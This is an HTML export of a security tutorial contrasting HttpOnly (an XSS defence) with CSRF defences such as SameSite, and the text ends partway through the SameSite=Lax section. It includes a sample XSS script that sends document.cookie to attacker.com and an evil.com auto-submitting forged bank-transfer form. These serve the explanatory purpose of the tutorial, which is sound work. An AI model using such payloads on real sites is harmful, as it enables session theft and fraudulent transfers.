<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Critical Clarification: HttpOnly vs CSRF Protection</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

/* Override strong tags inside headings to maintain consistent weight */
h1 strong,
h2 strong,
h3 strong {
	font-weight: 600;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 10px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.collection-content td {
	white-space: pre-wrap;
	word-break: break-word;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-flex;
	align-items: center;
	justify-content: center;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.callout img.notion-static-icon {
	width: 1em;
	height: 1em;
}

.callout p {
	margin: 0;
}

.callout h1,
.callout h2,
.callout h3 {
	margin: 0 0 0.6rem;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

blockquote.quote-large {
	font-size: 1.25em;
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(44, 44, 43, 1);
}
.highlight-gray {
	color: rgba(125, 122, 117, 1);
	fill: rgba(125, 122, 117, 1);
}
.highlight-brown {
	color: rgba(159, 118, 90, 1);
	fill: rgba(159, 118, 90, 1);
}
.highlight-orange {
	color: rgba(210, 123, 45, 1);
	fill: rgba(210, 123, 45, 1);
}
.highlight-yellow {
	color: rgba(203, 148, 52, 1);
	fill: rgba(203, 148, 52, 1);
}
.highlight-teal {
	color: rgba(80, 148, 110, 1);
	fill: rgba(80, 148, 110, 1);
}
.highlight-blue {
	color: rgba(56, 125, 201, 1);
	fill: rgba(56, 125, 201, 1);
}
.highlight-purple {
	color: rgba(154, 107, 180, 1);
	fill: rgba(154, 107, 180, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(207, 81, 72, 1);
	fill: rgba(207, 81, 72, 1);
}
.highlight-default_background {
	color: rgba(44, 44, 43, 1);
}
.highlight-gray_background {
	background: rgba(42, 28, 0, 0.07);
}
.highlight-brown_background {
	background: rgba(139, 46, 0, 0.086);
}
.highlight-orange_background {
	background: rgba(224, 101, 1, 0.129);
}
.highlight-yellow_background {
	background: rgba(211, 168, 0, 0.137);
}
.highlight-teal_background {
	background: rgba(0, 100, 45, 0.09);
}
.highlight-blue_background {
	background: rgba(0, 124, 215, 0.094);
}
.highlight-purple_background {
	background: rgba(102, 0, 178, 0.078);
}
.highlight-pink_background {
	background: rgba(197, 0, 93, 0.086);
}
.highlight-red_background {
	background: rgba(223, 22, 0, 0.094);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(125, 122, 117, 1);
	fill: rgba(125, 122, 117, 1);
}
.block-color-brown {
	color: rgba(159, 118, 90, 1);
	fill: rgba(159, 118, 90, 1);
}
.block-color-orange {
	color: rgba(210, 123, 45, 1);
	fill: rgba(210, 123, 45, 1);
}
.block-color-yellow {
	color: rgba(203, 148, 52, 1);
	fill: rgba(203, 148, 52, 1);
}
.block-color-teal {
	color: rgba(80, 148, 110, 1);
	fill: rgba(80, 148, 110, 1);
}
.block-color-blue {
	color: rgba(56, 125, 201, 1);
	fill: rgba(56, 125, 201, 1);
}
.block-color-purple {
	color: rgba(154, 107, 180, 1);
	fill: rgba(154, 107, 180, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(207, 81, 72, 1);
	fill: rgba(207, 81, 72, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(240, 239, 237, 1);
}
.block-color-brown_background {
	background: rgba(245, 237, 233, 1);
}
.block-color-orange_background {
	background: rgba(251, 235, 222, 1);
}
.block-color-yellow_background {
	background: rgba(249, 243, 220, 1);
}
.block-color-teal_background {
	background: rgba(232, 241, 236, 1);
}
.block-color-blue_background {
	background: rgba(229, 242, 252, 1);
}
.block-color-purple_background {
	background: rgba(243, 235, 249, 1);
}
.block-color-pink_background {
	background: rgba(250, 233, 241, 1);
}
.block-color-red_background {
	background: rgba(252, 233, 231, 1);
}
.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="2b4562ad-76f0-8045-9f8e-c00a8306e350" class="page mono"><header><h1 class="page-title" dir="auto">Critical Clarification: HttpOnly vs CSRF Protection</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-807d-b6d1-efd4b84a59bf" class=""><strong>⚠️ Common Misconception</strong></h2></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8040-9781-c0927f4b0eaf" class=""><strong>Question:</strong> &quot;If HttpOnly can only be used for CSRF tokens, then it is not protecting against CSRF attacks?&quot;</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8098-b6db-f28744733cf2" class=""><strong>Answer:</strong> This question reveals a common misunderstanding. Let me clarify:</p></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-8086-8eaf-c2ff5e6fef23" class=""><strong>The Truth</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-804b-a40f-ee1630599db3" class=""><strong>HttpOnly Does NOT Protect Against CSRF Attacks</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80e1-bffd-c0ed8cb79787" class=""><strong>HttpOnly protects against XSS (Cross-Site Scripting), NOT CSRF (Cross-Site Request Forgery).</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c7-a471-e662be8015ce" class="">These are two completely different attack vectors:</p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80c8-9b02-d41f90837c69"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-805b-9d12-ddf5e6b3616d" class=""><strong>Understanding the Attacks</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-804c-bfc9-f965f54d748d" class=""><strong>1. XSS Attack (What HttpOnly Protects Against)</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80be-9ba5-ee7b761f9745" class=""><strong>How XSS Works:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8062-a358-d04bb34b1609" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1. Attacker injects malicious JavaScript into a website
2. Victim visits the website
3. Malicious script runs in victim&#x27;s browser
4. Script accesses cookies via document.cookie
5. Script sends cookies to attacker&#x27;s server
6. Attacker uses stolen cookies to impersonate victim
</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80ec-9b34-c8b55e8cd566" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80ef-ad39-f2f26d2a470c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Vulnerable website has XSS vulnerability// Attacker injects this script:
&lt;script&gt;
// This JavaScript can access cookiesvar stolenCookie = document.cookie;
  fetch(&#x27;https://attacker.com/steal?cookie=&#x27; + stolenCookie);
&lt;/script&gt;

// If cookie has HttpOnly:Set-Cookie: sessionId=abc123; HttpOnly

// JavaScript CANNOT access it:console.log(document.cookie);// Does NOT include sessionId// XSS attack fails - cookie cannot be stolen</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-808b-9abe-f94411d0d11d" class=""><strong>HttpOnly Protection:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8020-b22c-de39bf38ca14" class="bulleted-list"><li style="list-style-type:disc">✅ Prevents JavaScript from accessing cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80de-9911-dad43f067d70" class="bulleted-list"><li style="list-style-type:disc">✅ Protects against XSS cookie theft</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8083-a9fc-d6b4e482f367" class="bulleted-list"><li style="list-style-type:disc">❌ Does NOT protect against CSRF</li></ul></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-802c-86b9-e0b5b3f62c25"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8010-825f-dff662490cbf" class=""><strong>2. CSRF Attack (What HttpOnly Does NOT Protect Against)</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8005-8693-e208d8ed2f54" class=""><strong>How CSRF Works:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8016-b21e-fdca4d098b38" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1. User is logged into bank.com (has session cookie)
2. User visits attacker&#x27;s website (evil.com)
3. Attacker&#x27;s website contains a form that submits to bank.com
4. Browser automatically includes user&#x27;s cookies with the request
5. Bank.com receives request WITH valid cookies
6. Bank.com processes the request (e.g., transfer money)
7. Attack succeeds even though user didn&#x27;t intend to do it
</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-808f-bbf0-e0cbb943da38" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8088-a7aa-d6a9f7367999" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- Attacker&#x27;s website: evil.com --&gt;&lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt;
  &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;attacker-account&quot;&gt;
  &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot;&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;

&lt;!-- Browser automatically sends cookies: --&gt;
POST https://bank.com/transfer HTTP/1.1
Host: bank.com
Cookie: sessionId=abc123&lt;!-- Automatically included by browser --&gt;
Content-Type: application/x-www-form-urlencoded

to=attacker-account&amp;amount=10000

&lt;!-- Bank.com receives valid session cookie --&gt;&lt;!-- Request is processed - attack succeeds! --&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c0-9f5d-e0ed1156a944" class=""><strong>HttpOnly Does NOT Help:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8088-bcc4-f1c32cf8eba7" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Even with HttpOnly:Set-Cookie: sessionId=abc123; HttpOnly; Secure

// Browser STILL automatically sends cookie with CSRF request:POST https://bank.com/transfer HTTP/1.1Cookie: sessionId=abc123  &lt;!-- Still sent automatically! --&gt;

// HttpOnly only prevents JavaScript access// It does NOT prevent browser from sending cookies with requests// CSRF attack still succeeds!</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8009-b751-c71cc189405d"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-803a-a716-e240db624755" class=""><strong>What Actually Protects Against CSRF?</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80e4-b8cd-fd0f53373215" class=""><strong>1. SameSite Attribute (Cookie-Level Protection)</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80ee-82ba-d08c40576ebf" class=""><strong>SameSite=Strict:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8043-b2a4-f648b639e82d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

// CSRF attack from evil.com:POST https://bank.com/transfer HTTP/1.1Cookie: (NOT SENT)  &lt;!-- Browser refuses to send cookie --&gt;

// Attack fails - cookie not sent with cross-site request</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8054-bb71-ee5feb22b09f" class=""><strong>SameSite=Lax:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80b0-88a7-e87822ecba57" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax

// CSRF POST request from evil.com:POST https://bank.com/transfer HTTP/1.1Cookie: (NOT SENT)  &lt;!-- Browser refuses to send cookie for POST --&gt;

